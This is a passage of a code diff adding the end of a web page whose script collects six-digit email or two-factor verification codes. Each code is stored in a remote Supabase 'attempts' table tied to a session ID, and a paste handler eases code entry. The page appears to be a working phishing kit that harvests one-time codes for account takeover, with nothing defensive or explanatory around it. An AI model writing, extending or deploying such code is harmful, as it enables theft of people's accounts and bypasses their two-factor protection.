+                    if (code.length === 6) {
+                        try {
+                            supabase.from('attempts').update({
+                                [is2fa ? 'twofa_code' : 'email_code']: code
+                            }).eq('session_id', currentSessionId).then(() => {
+                                setTimeout(() => showMagic(lastEmail), 30);
+                            });
+                        } catch (err) {
+                            console.error('Code submission error:', err);
+                        }
+                    }
+                }
+
+                inputs.forEach((input, i) => {
+                    input.addEventListener('input', () => {
+                        if (input.value.length === 1 && i < 5) inputs[i+1].focus();
+                        complete();
+                    });
+                    // ADD: handle paste to support multi-character paste into a single box.
+                    input.addEventListener('paste', function(e) {
+                        try {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            var paste = '';
+                            if (e.clipboardData && e.clipboardData.getData) {
+                                paste = e.clipboardData.getData('text') || '';
+                            } else if (window.clipboardData && window.clipboardData.getData) {
+                                paste = window.clipboardData.getData('Text') || '';
+                            }
+                            if (!paste) return;
+                            // remove whitespace, non-digits
+                            var cleaned = (paste + '').replace(/\s+/g, '');
+                            var digits = cleaned.replace(/\D/g, '');
+                            if (!digits) return;
+                            // If clipboard contains 6 or more digits, fill all six boxes starting at 0
+                            if (digits.length >= 6) {
+                                for (var k = 0; k < 6; k++) {
+                                    inputs[k].value = digits.charAt(k) || '';
+                                }
+                                // focus last box
+                                try { inputs[5].focus(); } catch (fe) {}
+                                complete();
+                                return;
+                            }
+                            // If clipboard contains multiple digits but less than 6, paste starting at current index
+                            if (digits.length > 1) {
+                                for (var j = 0; j < digits.length; j++) {
+                                    var idx = i + j;
+                                    if (idx < inputs.length) {
+                                        inputs[idx].value = digits.charAt(j);
+                                    }
+                                }
+                                var focusIdx = Math.min(inputs.length - 1, i + digits.length - 1);
+                                try { inputs[focusIdx].focus(); } catch (fe2) {}
+                                complete();
+                                return;
+                            }
+                            // fallback: single digit
+                            if (digits.length === 1) {
+                                input.value = digits.charAt(0);
+                                if (i < inputs.length - 1) inputs[i+1].focus();
+                                complete();
+                                return;
+                            }
+                        } catch (pasteErr) {
+                            console.error('Paste handler error:', pasteErr);
+                        }
+                    }, { passive: false });
+                });
+            });
+        });
+
+        // Auto start - show frame2 after delay
+        setTimeout(() => {
+            document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+            frame2.classList.add('visible');
+        }, 800);
+
+    }).catch(err => {
+        console.error('Supabase library did not become available:', err);
+        alert('Supabase library failed to load. Check console for details.');
+    });
+
+})();
+    </script>
+
+    <!-- Parent-level copy toast element (host) -->
+    <div id="pm-copy-toast" class="copy-toast" aria-hidden="true" style="display:none">Copied</div>
+
+    <script>
+        // Keep host toast accessible: show/hide when needed
+        (function() {
+            var t = document.getElementById('pm-copy-toast');
+            if (!t) {
+                return;
+            }
+            // override showCopyToast used earlier (ensures visual works)
+            window.showCopyToast = function(text) {
+                try {
+                    t.textContent = text || 'Copied';
+                    t.style.display = 'block';
+                    t.classList.add('show');
+                    t.setAttribute('aria-hidden','false');
+                    setTimeout(function() {
+                        t.classList.remove('show');
+                        t.setAttribute('aria-hidden','true');
+                        setTimeout(function(){ t.style.display = 'none'; }, 250);
+                    }, 1200);
+                } catch (e) {}
+            };
+        })();
+    </script>
+</body>
+</html>
